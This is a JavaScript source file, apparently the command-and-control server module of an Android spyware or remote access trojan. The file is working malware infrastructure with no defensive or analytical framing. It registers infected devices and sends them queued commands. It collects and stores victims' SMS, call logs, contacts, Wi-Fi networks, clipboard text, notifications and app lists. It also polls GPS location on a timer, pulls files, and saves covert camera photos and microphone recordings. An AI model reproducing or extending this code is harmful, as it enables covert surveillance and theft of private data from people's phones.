const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const config = require('./config');
const db = require('./db');
const { logger } = require('./logs');

class ClientManager {
    constructor() {
        this.sockets = {};
        this.dbs = {};
        this.gpsTimers = {};
        this.transfers = {};
        logger.info('Client manager initialized');
    }

    // Connection handling
    connect(socket, id, data) {
        try {
            this.sockets[id] = socket;
            
            const client = db.main.get('clients').find({ id });
            const now = new Date().toISOString();
            
            if (client.value()) {
                client.assign({ lastSeen: now, online: true, ...data }).write();
                logger.clientConnected(id, data.ip, data.device);
            } else {
                db.main.get('clients').push({ id, firstSeen: now, lastSeen: now, online: true, ...data }).write();
                logger.clientConnected(id, data.ip, data.device);
            }
            
            this.setupHandlers(id);
            this.runQueue(id);
        } catch (e) {
            logger.systemError('Client connect failed', e);
        }
    }

    disconnect(id) {
        try {
            db.main.get('clients').find({ id }).assign({ 
                online: false, 
                lastSeen: new Date().toISOString() 
            }).write();
            
            delete this.sockets[id];
            this.clearGps(id);
            logger.clientDisconnected(id);
        } catch (e) {
            logger.systemError('Client disconnect failed', e);
        }
    }

    getDb(id) {
        if (!this.dbs[id]) {
            try {
                this.dbs[id] = db.client(id);
            } catch (e) {
                logger.systemError('Failed to get client DB', e);
                return null;
            }
        }
        return this.dbs[id];
    }

    // Lists
    online() { 
        return db.main.get('clients').filter({ online: true }).value(); 
    }
    
    offline() { 
        return db.main.get('clients').filter({ online: false }).value(); 
    }
    
    all() {
        return db.main.get('clients').value();
    }
    
    get(id) {
        return db.main.get('clients').find({ id }).value();
    }

    // Commands
    send(id, cmd, params = {}, cb = () => {}) {
        try {
            const client = this.get(id);
            if (!client) {
                logger.commandFailed(id, cmd, 'Client not found');
                return cb('Client not found');
            }
            
            params.type = cmd;
            
            if (this.sockets[id]) {
                this.sockets[id].emit('order', params);
                logger.commandSent(id, cmd, params);
                cb(null, 'Sent');
            } else {
                this.queue(id, params, cb);
            }
        } catch (e) {
            logger.commandFailed(id, cmd, e.message);
            cb(e.message);
        }
    }

    queue(id, params, cb) {
        try {
            const cdb = this.getDb(id);
            if (!cdb) {
                logger.commandFailed(id, params.type, 'Database unavailable');
                return cb('Database unavailable');
            }
            
            const existing = cdb.get('queue').find({ type: params.type }).value();
            if (existing) {
                logger.warning(`Command ${params.type} already queued for ${id}`, 'client');
                return cb('Already queued');
            }
            
            params.uid = Date.now();
            cdb.get('queue').push(params).write();
            logger.commandQueued(id, params.type);
            cb(null, 'Queued');
        } catch (e) {
            logger.commandFailed(id, params.type, e.message);
            cb(e.message);
        }
    }

    runQueue(id) {
        try {
            const cdb = this.getDb(id);
            if (!cdb) return;
            
            const queue = cdb.get('queue').value();
            
            queue.forEach(cmd => {
                if (this.sockets[id]) {
                    this.sockets[id].emit('order', cmd);
                    cdb.get('queue').remove({ uid: cmd.uid }).write();
                    logger.info(`Executed queued command ${cmd.type} for ${id}`, 'client');
                }
            });
        } catch (e) {
            logger.systemError('Run queue failed', e);
        }
    }

    // GPS polling
    setGps(id, interval) {
        try {
            this.clearGps(id);
            
            if (interval > 0 && this.sockets[id]) {
                this.gpsTimers[id] = setInterval(() => {
                    this.send(id, config.msg.location, {});
                }, interval * 1000);
                
                const cdb = this.getDb(id);
                if (cdb) {
                    cdb.set('gpsInterval', interval).write();
                }
                
                logger.info(`GPS polling started for ${id} (interval: ${interval}s)`, 'client');
            } else if (interval === 0) {
                const cdb = this.getDb(id);
                if (cdb) {
                    cdb.set('gpsInterval', 0).write();
                }
                logger.info(`GPS polling stopped for ${id}`, 'client');
            }
        } catch (e) {
            logger.systemError('Set GPS failed', e);
        }
    }

    clearGps(id) {
        if (this.gpsTimers[id]) {
            clearInterval(this.gpsTimers[id]);
            delete this.gpsTimers[id];
        }
    }

    // Data for pages
    getData(id, page) {
        try {
            const cdb = this.getDb(id);
            const client = this.get(id);
            
            if (!client) return null;
            
            const pages = {
                info: () => ({ client }),
                sms: () => ({ list: cdb?.get('sms').value() || [] }),
                calls: () => ({ list: cdb?.get('calls').value() || [] }),
                contacts: () => ({ list: cdb?.get('contacts').value() || [] }),
                wifi: () => ({ list: cdb?.get('wifi').value() || [] }),
                clipboard: () => ({ list: cdb?.get('clipboard').value() || [] }),
                notifications: () => ({ list: cdb?.get('notifications').value() || [] }),
                permissions: () => ({ list: cdb?.get('permissions').value() || [] }),
                apps: () => ({ list: cdb?.get('apps').value() || [] }),
                gps: () => ({ 
                    list: cdb?.get('gps').value() || [], 
                    interval: cdb?.get('gpsInterval').value() || 0 
                }),
                files: () => ({ 
                    list: cdb?.get('files').value() || [],
                    path: cdb?.get('currentPath').value() || ''
                }),
                downloads: () => ({ list: cdb?.get('downloads').value() || [] }),
                camera: () => ({ 
                    cameras: cdb?.get('cameras').value() || [], 
                    photos: cdb?.get('photos').value() || [] 
                }),
                mic: () => ({})
            };
            
            return pages[page] ? pages[page]() : null;
        } catch (e) {
            logger.systemError('Get data failed', e);
            return null;
        }
    }

    // Socket event handlers
    setupHandlers(id) {
        const socket = this.sockets[id];
        const cdb = this.getDb(id);
        
        if (!socket || !cdb) {
            logger.error(`Failed to setup handlers for ${id}`, 'client');
            return;
        }
        
        socket.on('disconnect', () => this.disconnect(id));
        socket.on('pong', () => {});
        
        // SMS
        socket.on(config.msg.sms, data => {
            try {
                if (data.smslist) {
                    cdb.set('sms', data.smslist).write();
                    logger.dataReceived(id, 'SMS', data.smslist.length);
                }
            } catch (e) {
                logger.systemError('SMS handler failed', e);
            }
        });
        
        // Calls
        socket.on(config.msg.calls, data => {
            try {
                if (data.callsList) {
                    cdb.set('calls', data.callsList).write();
                    logger.dataReceived(id, 'calls', data.callsList.length);
                }
            } catch (e) {
                logger.systemError('Calls handler failed', e);
            }
        });
        
        // Contacts
        socket.on(config.msg.contacts, data => {
            try {
                if (data.contactsList) {
                    cdb.set('contacts', data.contactsList).write();
                    logger.dataReceived(id, 'contacts', data.contactsList.length);
                }
            } catch (e) {
                logger.systemError('Contacts handler failed', e);
            }
        });
        
        // WiFi
        socket.on(config.msg.wifi, data => {
            try {
                if (data.networks) {
                    cdb.set('wifi', data.networks).write();
                    logger.dataReceived(id, 'WiFi networks', data.networks.length);
                }
            } catch (e) {
                logger.systemError('WiFi handler failed', e);
            }
        });
        
        // Clipboard
        socket.on(config.msg.clipboard, data => {
            try {
                if (data.text) {
                    cdb.get('clipboard').push({ 
                        text: data.text, 
                        time: new Date().toISOString() 
                    }).write();
                    logger.dataReceived(id, 'clipboard');
                }
            } catch (e) {
                logger.systemError('Clipboard handler failed', e);
            }
        });
        
        // Notifications
        socket.on(config.msg.notification, data => {
            try {
                cdb.get('notifications').push({ 
                    ...data, 
                    time: new Date().toISOString() 
                }).write();
                logger.dataReceived(id, 'notification');
            } catch (e) {
                logger.systemError('Notification handler failed', e);
            }
        });
        
        // Permissions
        socket.on(config.msg.permissions, data => {
            try {
                if (data.permissions) {
                    cdb.set('permissions', data.permissions).write();
                    logger.dataReceived(id, 'permissions', data.permissions.length);
                }
            } catch (e) {
                logger.systemError('Permissions handler failed', e);
            }
        });
        
        // Apps
        socket.on(config.msg.apps, data => {
            try {
                if (data.apps) {
                    cdb.set('apps', data.apps).write();
                    logger.dataReceived(id, 'apps', data.apps.length);
                }
            } catch (e) {
                logger.systemError('Apps handler failed', e);
            }
        });
        
        // Location
        socket.on(config.msg.location, data => {
            try {
                if (data.latitude) {
                    cdb.get('gps').push({ 
                        ...data, 
                        time: new Date().toISOString() 
                    }).write();
                    logger.dataReceived(id, 'GPS location');
                }
            } catch (e) {
                logger.systemError('Location handler failed', e);
            }
        });
        
        // Files
        socket.on(config.msg.files, data => this.handleFiles(id, data));
        
        // Camera
        socket.on(config.msg.camera, data => this.handleCamera(id, data));
        
        // Mic
        socket.on(config.msg.mic, data => this.handleMic(id, data));
    }

    handleFiles(id, data) {
        try {
            const cdb = this.getDb(id);
            if (!cdb) return;
            
            if (data.type === 'list') {
                cdb.set('files', data.list || []).write();
                cdb.set('currentPath', data.path || '').write();
                logger.dataReceived(id, 'file list', data.list?.length || 0);
            } else if (data.type === 'download' && data.buffer) {
                this.saveFile(id, data.name, data.buffer, 'downloads');
            } else if (data.type === 'download_start') {
                this.transfers[data.transferId] = { 
                    name: data.name, 
                    chunks: [], 
                    total: data.totalChunks 
                };
                logger.info(`File transfer started: ${data.name} from ${id}`, 'file');
            } else if (data.type === 'download_chunk') {
                const t = this.transfers?.[data.transferId];
                if (t) t.chunks[data.chunkIndex] = data.chunkData;
            } else if (data.type === 'download_end') {
                const t = this.transfers?.[data.transferId];
                if (t) {
                    this.saveFile(id, t.name, t.chunks.join(''), 'downloads');
                    delete this.transfers[data.transferId];
                    logger.info(`File transfer completed: ${t.name} from ${id}`, 'file');
                }
            }
        } catch (e) {
            logger.systemError('Files handler failed', e);
        }
    }

    handleCamera(id, data) {
        try {
            const cdb = this.getDb(id);
            if (!cdb) return;
            
            if (data.camList) {
                cdb.set('cameras', data.list || []).write();
                logger.dataReceived(id, 'camera list', data.list?.length || 0);
            } else if (data.image && data.buffer) {
                this.saveFile(id, `cam${data.cameraId}_${Date.now()}.jpg`, data.buffer, 'photos');
            }
        } catch (e) {
            logger.systemError('Camera handler failed', e);
        }
    }

    handleMic(id, data) {
        try {
            if (data.file && data.buffer) {
                this.saveFile(id, data.name || `mic_${Date.now()}.mp4`, data.buffer, 'downloads');
            }
        } catch (e) {
            logger.systemError('Mic handler failed', e);
        }
    }

    saveFile(id, name, buffer, type) {
        const dir = type === 'photos' ? config.photosPath : config.downloadsPath;
        const hash = crypto.createHash('md5').update(Date.now().toString()).digest('hex').slice(0, 10);
        const ext = path.extname(name) || '.bin';
        const filename = `${hash}${ext}`;
        const filepath = path.join(dir, filename);
        
        try {
            const data = typeof buffer === 'string' ? Buffer.from(buffer, 'base64') : buffer;
            fs.writeFileSync(filepath, data);
            
            const cdb = this.getDb(id);
            if (cdb) {
                const entry = { 
                    name, 
                    file: `/${type === 'photos' ? 'photos' : 'downloads'}/${filename}`, 
                    time: new Date().toISOString() 
                };
                
                if (type === 'photos') {
                    cdb.get('photos').push(entry).write();
                } else {
                    cdb.get('downloads').push(entry).write();
                }
            }
            
            logger.fileSaved(id, name, type);
        } catch (e) {
            logger.fileSaveFailed(id, name, e.message);
        }
    }
}

module.exports = new ClientManager();
